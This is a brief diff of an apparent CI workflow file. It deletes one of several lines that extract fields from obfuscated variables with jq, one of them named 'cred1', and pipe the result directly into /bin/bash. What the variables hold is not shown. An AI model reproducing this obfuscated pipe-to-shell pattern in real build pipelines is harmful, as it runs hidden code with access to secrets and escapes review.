@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$hdpcv738" | jq -r .dcxq63345 | /bin/bash
           printf '%s' "$mcu49" | jq -r .b3 | /bin/bash
           echo $cred1 | jq -r .bwgkd06 | /bin/bash
-          printf '%s' "$f833" | jq -r .vd1522 | /bin/bash
           echo $nfz99 | jq -r .pv8 | /bin/bash
           echo $xyq8125 | jq -r .u688 | /bin/bash
           printf '%s' "$c975" | jq -r .qbci99678 | /bin/bash
